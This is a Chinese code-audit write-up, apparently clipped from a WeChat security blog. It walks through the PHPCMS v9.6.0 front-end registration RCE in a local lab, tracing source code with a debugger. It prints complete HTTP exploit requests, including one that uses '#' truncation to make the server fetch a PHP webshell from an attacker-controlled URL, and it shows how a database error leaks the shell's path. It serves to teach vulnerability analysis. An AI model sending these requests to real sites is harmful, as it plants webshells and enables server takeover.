---
title: 【微信】PHP代码审计-PHPCMS 前台RCE漏洞
source: https://mp.weixin.qq.com/s/whxU3U2P_DcHJR2-bnW3Hg
source_host: mp.weixin.qq.com
clip_date: 2026-10-31T21:00:46+08:00
trace_id: 1fea1e78-c690-4ed5-96a6-c3601a909c2f
content_hash: a568b8dcaa3fdec95753393b67411dd473c86c3c6c900ad014e04cee6ecb6628
status: synced
tags:
  - 微信
  - 漏洞分析
  - 代码审计
series: null
feed_source: 公众号聚合·Doonsec
ai_summary: "PHPCMS v9.6.0 前台注册功能存在 RCE：经 editor→download 链路，利用 # 截断绕过扩展名白名单写入 WebShell。"
ai_summary_style: key-points
images_status:
  total: 15
  succeeded: 15
  failed_urls: []
notion_page_id: 40a75244-d011-819c-927d-f70194bce334
ioc: null
---

> 💡 **AI 总结（key-points）**
>
> PHPCMS v9.6.0 前台注册功能存在 RCE：经 editor→download 链路，利用 # 截断绕过扩展名白名单写入 WebShell。
> 
> - **漏洞入口：** 会员注册接口 `?m=member&c=index&a=register` 中，member_input 类的 get() 会按 model_field 缓存里的 formtype 值动态调用同名方法，formtype=editor 时触发附件远程下载逻辑。
> - **进入条件：** 需将 modelid 改为 1/3/11，且提交的字段名必须存在于对应模型字段缓存中（modelid=1 时字段须为 content），否则直接报“模型中不存在该字段”。
> - **绕过过滤：** download() 的正则仅放行 gif|jpg|jpeg|bmp|png 后缀，但 fillurl() 会截断 # 之后的内容，构造 `src=http://127.0.0.1/test.php#.png` 即可让服务器下载并保存为 PHP 文件。
> - **地址回显：** WebShell 落地后路径未知，携带 info[content] 数据继续注册导致插入会员模型数据时数据库报错，从报错信息中爆出 WebShell 完整连接地址，最终实现 RCE。
> - **调试要点：** 该功能点含异步请求，必须先抓取完整注册数据包再重放，否则动态调试的控制流会出现偏差。

**风铃Sec** *2026年10月31日 20:25*

如果你也刚好在学习代码审计，不妨下载如下源码跟着文章一起跟一下漏洞调用链，源码打包如下：

```
phpcms_v9.6.0_UTF8.zip

链接: https://pan.baidu.com/s/1_cTRfMHNcsRrop8j1xZgGg?pwd=9hty 提取码: 9hty
链接：https://pan.quark.cn/s/79db348a9b43
```

系统部署、路由分析部分请看笔上一篇文章《PHP代码审计-PHPCMS-SQL注入》。

来到注册界面，具体URL为：

```
http://192.168.213.1/phpcms-rce/index.php?m=member&c=index&a=register&siteid=1
```

输入对应的信息，完成注册流程，抓包，得到如下数据包，将数据包发送至Burpsuite的重放模块：

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/bdad2661749a92e1.png)

打开phpstorm开始，根据注册界面的URL定位到对应的代码片段。

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/c506dac69db65ee1.png)

下断点，Burp重放模块发包，开始动态调试。

因为该功能点存在异步请求，所以必须要获得整体的注册数据包后再重放该数据，否则执行的控制流会出现偏差。

###### 注：php代码动态调试具体配置可参考笔者PHP代码审计第一篇文章《PHP代码审计-动态调试配置（附环境）》，虽然使用的PHP版本可能不一样，但是过程都是一样的。

## 动态调试注册流程

紧接着就可以开始进行动态调试，一路按 `Step over` ，来到核心代码：

```php
if($member_setting['choosemodel']) {
    require_once CACHE_MODEL_PATH.'member_input.class.php'; 
    require_once CACHE_MODEL_PATH.'member_update.class.php';
    //导入两个类：.\caches\caches_model\caches_datahe 目录中的 member_input.class.php和 member_update.class.php
    
    $member_input = new member_input($userinfo['modelid']);     
    $_POST['info'] = array_map('new_html_special_chars',$_POST['info']); 
    //调用new_html_special_chars 函数对 info 进行处理，将特殊字符转换为 HTML 实体
    $user_model_info = $member_input->get($_POST['info']);
}
```

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/3775af8a98d23e17.png)

跟进get()函数：

```php
function get($data) {
    $this->data = $data = trim_script($data);  //防XSS
    $model_cache = getcache('member_model', 'commons');
    $this->db->table_name = $this->db_pre.$model_cache[$this->modelid]['tablename'];

    $info = array();
    $debar_filed = array('catid','title','style','thumb','status','islink','description');
    if(is_array($data)) {
        foreach($data as $field=>$value) {
            if($data['islink']==1 && !in_array($field,$debar_filed)) continue;
            $field = safe_replace($field);
            $name = $this->fields[$field]['name'];
            $minlength = $this->fields[$field]['minlength'];
            $maxlength = $this->fields[$field]['maxlength'];
            $pattern = $this->fields[$field]['pattern'];
            $errortips = $this->fields[$field]['errortips'];
            if(empty($errortips)) $errortips = "$name 不符合要求！";
            $length = empty($value) ? 0 : strlen($value);
            if($minlength && $length < $minlength && !$isimport) showmessage("$name 不得少于 $minlength 个字符！");
            if (!array_key_exists($field, $this->fields)) showmessage('模型中不存在'.$field.'字段');
            if($maxlength && $length > $maxlength && !$isimport) {
                showmessage("$name 不得超过 $maxlength 个字符！");
            } else {
                str_cut($value, $maxlength);
            }
            if($pattern && $length && !preg_match($pattern, $value) && !$isimport) showmessage($errortips);
            if($this->fields[$field]['isunique'] && $this->db->get_one(array($field=>$value),$field) && ROUTE_A != 'edit') showmessage("$name 的值不得重复！");
            $func = $this->fields[$field]['formtype'];
            if(method_exists($this, $func)) $value = $this->$func($field, $value);

            $info[$field] = $value;
        }
    }
    return $info;
}
```

在迭代最后有一个函数动态调用：

```bash
$func = $this->fields[$field]['formtype'];   //datetime
if(method_exists($this, $func)) $value = $this->$func($field, $value);
```

`$func` 最后的值为 `datetime`:

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/1e73b101b64d0a71.png)

这个 `datetime` 函数是从 `fields` 数组中提取出来的，此时我们可以先确定一下 `fields` 中的数据是从哪里来的，重点是要确认除了 `datetime` 之外，还有哪些函数是可以被取到的。在当前文件中搜索 `fields` ，得到如下代码（ `member_input.class.php` 的构造函数）

```kotlin
function __construct($modelid) {
    $this->db = pc_base::load_model('sitemodel_field_model');
    $this->db_pre = $this->db->db_tablepre;
    $this->modelid = $modelid;
    $this->fields = getcache('model_field_'.$modelid,'model');
```

## fields缓存来源分析

关注 `fields` ，它不是在 `member_input` 构造函数中现场查询数据库得到的，而是通过 `getcache()` 从缓存系统中读取的。缓存数据可能来源于该数据库表，但需要找到生成缓存的代码才能确认两者的关系。这个时候可以先找一下缓存是在哪里写入的，在源码中搜索：

```
setcache('model_field_
```

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/5458e5a4e7557bb0.png)

找到五段代码：

根据这五段代码分析，基本可以断定 `model_field` 数据库表中的字段配置会被读取出来并整理成数组，再写入 model_field\_模型ID 对应的缓存中。整个调用链：

```
model_field 数据库表 → select() 查询字段配置 → 整理成 $field_array → setcache() 写入缓存 → getcache() 读取缓存 → $this->fields → 校验和处理用户提交的字段
```

现在进入 `model_field` 查看 `formtype` 字段：

```
select modelid, formtype from v9_model_field;
```

得到如下函数：

```
box
catid
copyfrom
datetime
downfile
downfiles
editor
groupid
image
images
islink
keyword
number
omnipotent
pages
posid
readpoint
template
text
textarea
title
typeid
video
```

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/19f533d7d66e2de1.png)

对应的modelid应为1，3，11。

接着通过上述函数名，在php代码中搜索函数代码具体实现，这边聚焦editor函数：

```php
function editor($field, $value) {
    $setting = string2array($this->fields[$field]['setting']);
    $enablesaveimage = $setting['enablesaveimage'];
    $site_setting = string2array($this->site_config['setting']);
    $watermark_enable = intval($site_setting['watermark_enable']);
    $value = $this->attachment->download('content', $value, $watermark_enable);
    return $value;
}
```

**注意：动态调试要进入这个函数有一个坑点，要想让控制流进入editor，仅仅讲modelid修改为1、3或者11是不够的。假设你将 `$modelid` 修改为 `1` ，那么程序读取的是：**

```
$this->fields = getcache('model_field_1', 'model');
```

而在 `get()` 中遇到的判断是：

```
if (!array_key_exists($field, $this->fields)) {
    showmessage('模型中不存在'.$field.'字段');
}
```

**这意味着：当前提交的字段名 `$field` 必须存在于所选模型的字段配置数组中，否则就会报错。** 所以这个时候要想进入控制流就得先去 `'model_field_(1,3,11).cache'` 或者数据库中查看查看对应 `field` 字段。

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/24008343663bb134.png)

`modelid` 为1时，field需要为 `content` ，这个时候才能够进入 `editor` 函数，所以构造如下数据包：

```
POST /phpcms-rce/index.php?m=member&c=index&a=register&siteid=1 HTTP/1.1
Host: 192.168.213.1
Content-Length: 318
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/155.0.0.0 Safari/537.36
Origin: http://192.168.213.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/jxl,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://192.168.213.1/phpcms-rce/index.php?m=member&c=index&a=register&siteid=1
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Cookie: XDEBUG_SESSION=12514; PHPSESSID=onfqvj5ve5c0mhlfnsgq7aria2
Connection: keep-alive

siteid=1&modelid=11&username=bssssssaws&password=admin123&pwdconfirm=admin123&email=adsxsssssxsw%40qq.com&nickname=sxsxssaiqa&info[content]=Hello&info%5Bbirthday%5D=2026-10-01&dosubmit=%E5%90%8C%E6%84%8F%E6%B3%A8%E5%86%8C%E5%8D%8F%E8%AE%AE%EF%BC%8C%E6%8F%90%E4%BA%A4%E6%B3%A8%E5%86%8C&protocol=
```

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/474b4cd5c8879cdb.png)

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/9340672c475101b3.png)

`editor()` 函数主要用于处理编辑器提交的内容，并调用附件组件的 `download()` 方法处理内容中的资源。这边继续追踪 `download()` 的具体实现。

```ruby
function download($field, $value,$watermark = '0',$ext = 'gif|jpg|jpeg|bmp|png', $absurl = '', $basehref = '')
{
    global $image_d;
    $this->att_db = pc_base::load_model('attachment_model');
    $upload_url = pc_base::load_config('system','upload_url'); 
    //upload_url = http://127.0.0.1/phpcms-rce/uploadfile/
    
    $this->field = $field;
    $dir = date('Y/md/');   
    $uploadpath = $upload_url.$dir;   
    // http://127.0.0.1/phpcms-rce/uploadfile/Y/md/
    
    $uploaddir = $this->upload_root.$dir;
    $string = new_stripslashes($value);
    
    //使用正则表达式，从 $string 中查找符合条件的 href 或 src 属性，并将匹配结果保存到 $matches；如果一个都没匹配到，就直接返回原始的 $value。
    if(!preg_match_all("/(href|src)=([\"|']?)([^ \"'>]+\.($ext))\\2/i", $string, $matches)) return $value;
    $remotefileurls = array();
    
    //遍历正则表达式匹配到的资源地址，筛选出包含 :// 的地址，创建上传目录，然后调用 fillurl() 处理地址，并保存到 $remotefileurls 数组中。
    foreach($matches[3] as $matche)
    {
        if(strpos($matche, '://') === false) continue;
        dir_create($uploaddir);
        $remotefileurls[$matche] = $this->fillurl($matche, $absurl, $basehref);
    }
    unset($matches, $string);
    $remotefileurls = array_unique($remotefileurls);
    $oldpath = $newpath = array();
    
    //遍历 $remotefileurls 数组，检查每个处理后的 URL，如果不包含 ://，或者包含 $upload_url，就跳过本次循环，不再处理这个地址。
    foreach($remotefileurls as $k=>$file) {
        if(strpos($file, '://') === false || strpos($file, $upload_url) !== false) continue;
        $filename = fileext($file);
        $file_name = basename($file);
        $filename = $this->getname($filename);

    //把远程图片下载到本地后，记录图片路径、设置文件权限、按需添加水印，并将附件信息保存到数据库中。
        $newfile = $uploaddir.$filename;
        $upload_func = $this->upload_func;
        if($upload_func($file, $newfile)) {
            $oldpath[] = $k;
            $GLOBALS['downloadfiles'][] = $newpath[] = $uploadpath.$filename;
            @chmod($newfile, 0777);
            $fileext = fileext($filename);
            if($watermark){
                watermark($newfile, $newfile,$this->siteid);
            }
            $filepath = $dir.$filename;
            $downloadedfile = array('filename'=>$filename, 'filepath'=>$filepath, 'filesize'=>filesize($newfile), 'fileext'=>$fileext);
            $aid = $this->add($downloadedfile);
            $this->downloadedfiles[$aid] = $filepath;
        }
    }
    return str_replace($oldpath, $newpath, $value);
}
```

到这里我们就可以进行文件上传了，因为download函数是从 $string 中查找符合条件的 href 或 src 属性后提取URL后进行文件下载，所以这个时候可以构造如下数据包：

```
POST /phpcms-rce/index.php?m=member&c=index&a=register&siteid=1 HTTP/1.1
Host: 192.168.213.1
Content-Length: 318
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/155.0.0.0 Safari/537.36
Origin: http://192.168.213.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/jxl,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://192.168.213.1/phpcms-rce/index.php?m=member&c=index&a=register&siteid=1
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Cookie: XDEBUG_SESSION=12514; PHPSESSID=onfqvj5ve5c0mhlfnsgq7aria2
Connection: keep-alive

siteid=1&modelid=11&username=bssssssaws&password=admin123&pwdconfirm=admin123&email=adsxsssssxsw%40qq.com&nickname=sxsxssaiqa&info[content]=src=http://127.0.0.1/test.png&info%5Bbirthday%5D=2026-10-01&dosubmit=%E5%90%8C%E6%84%8F%E6%B3%A8%E5%86%8C%E5%8D%8F%E8%AE%AE%EF%BC%8C%E6%8F%90%E4%BA%A4%E6%B3%A8%E5%86%8C&protocol=
```

成功下载图片文件。

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/34434b6fa6ce01d4.png)

## 绕过扩展名过滤

文件可以正常上传之后，下一步就要摸索如何上传php文件了。上传文件的类型是根据 `download` 函数中的正则表达式来过滤的：

```swift
//$ext = 'gif|jpg|jpeg|bmp|png'
!preg_match_all("/(href|src)=([\"|']?)([^ \"'>]+\.($ext))\\2/i", $string, $matches)
```

该正则只允许匹配 `$ext` 中定义的这几个类型。再次审计download()函数后发现在文件下载之前，调用 `fillurl` 又对下载地址进行进一步处理。

```php
foreach($matches[3] as $matche)
{
    if(strpos($matche, '://') === false) continue;
    dir_create($uploaddir);
    $remotefileurls[$matche] = $this->fillurl($matche, $absurl, $basehref);
}
```

跟进 `fillurl` 函数：

```php
function fillurl($surl, $absurl, $basehref = '') {
    if($basehref != '') {
        $preurl = strtolower(substr($surl,0,6));
        if($preurl=='http://' || $preurl=='ftp://' ||$preurl=='mms://' || $preurl=='rtsp://' || $preurl=='thunde' || $preurl=='emule://'|| $preurl=='ed2k://')
        return  $surl;
        else
        return $basehref.'/'.$surl;
    }
    $i = 0;
    $dstr = '';
    $pstr = '';
    $okurl = '';
    $pathStep = 0;
    $surl = trim($surl);
    if($surl=='') return '';
    $urls = @parse_url(SITE_URL);
    $HomeUrl = $urls['host'];
    $BaseUrlPath = $HomeUrl.$urls['path'];
    $BaseUrlPath = preg_replace("/\/([^\/]*)\.(.*)$/",'/',$BaseUrlPath);
    $BaseUrlPath = preg_replace("/\/$/",'',$BaseUrlPath);
    
    //去掉 URL 中的片段标识，# 后面的内容叫 URL 片段标识，通常用于定位页面中的某个位置。这样做可以避免片段标识符干扰后续的地址解析和文件处理。
    $pos = strpos($surl,'#');
    if($pos>0) $surl = substr($surl,0,$pos);
```

这个时候可以尝试设置如下地址：

```
src=http://127.0.0.1/test.php#.png
```

此时该地址进入 `fillurl` 之后就会将 `#` 后面的内容截断掉

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/11a0c421719cca75.png)

完整数据包如下：

```
POST /phpcms-rce/index.php?m=member&c=index&a=register&siteid=1 HTTP/1.1
Host: 192.168.213.1
Content-Length: 323
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/155.0.0.0 Safari/537.36
Origin: http://192.168.213.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/jxl,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://192.168.213.1/phpcms-rce/index.php?m=member&c=index&a=register&siteid=1
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Cookie: XDEBUG_SESSION=12514; PHPSESSID=onfqvj5ve5c0mhlfnsgq7aria2
Connection: keep-alive

siteid=1&modelid=11&username=bssssssaws&password=admin123&pwdconfirm=admin123&email=adsxsssssxsw%40qq.com&nickname=sxsxssaiqa&info[content]=src=http://127.0.0.1/test.php#.png&info%5Bbirthday%5D=2026-10-01&dosubmit=%E5%90%8C%E6%84%8F%E6%B3%A8%E5%86%8C%E5%8D%8F%E8%AE%AE%EF%BC%8C%E6%8F%90%E4%BA%A4%E6%B3%A8%E5%86%8C&protocol=
```

持续步进，发现最后保存的文件为php文件。 **别忘记将exploit server中的文件重命名为xxxx.php**，下图标红内容为download函数下载地址：

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/b993bdaf1a30863a.png)

把剩下的代码走完，最后WebShell被download函数下载到服务器中。

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/d518f6e16f9e3096.png)

## WebShell地址获取

走到这里我们还需要解决一个问题，就是怎么确认Webshell的连接地址？这会儿就需要回到 `register` 方法中继续走。

```ruby
if(pc_base::load_config('system', 'phpsso')) {
    $this->_init_phpsso();
    $status = $this->client->ps_member_register($userinfo['username'], $userinfo['password'], $userinfo['email'], $userinfo['regip'], $userinfo['encrypt']);
    if($status > 0) {
        $userinfo['phpssouid'] = $status;
        //传入phpsso为明文密码，加密后存入phpcms_v9
        $password = $userinfo['password'];
        $userinfo['password'] = password($userinfo['password'], $userinfo['encrypt']);
        $userid = $this->db->insert($userinfo, 1);
        if($member_setting['choosemodel']) {    //如果开启选择模型
            $user_model_info['userid'] = $userid;
            //插入会员模型数据
            $this->db->set_model($userinfo['modelid']);
            $this->db->insert($user_model_info);
        }
```

核心作用是 **在开启 PHPSso 单点登录时，将新用户同步注册到 PHPSso 用户中心，然后再保存到本地会员表**。可以看到最后插入会员模型数据得这段代码：

```kotlin
//插入会员模型数据
$this->db->set_model($userinfo['modelid']);
$this->db->insert($user_model_info);
```

我们在注册页面提交得注册信息会被插入数据库中，但是由于请求包已经增加了如下数据：

```
info[content]=src=http://127.0.0.1/test.php#.png
```

这个时候在进行数据插入的时候会报错，从而将完整地址爆出来：

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/8f76cf1d197df7b1.png)

## 漏洞利用成功

最后成功RCE：

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/ed4cad1d71513054.png)

PHP代码审计 · 目录
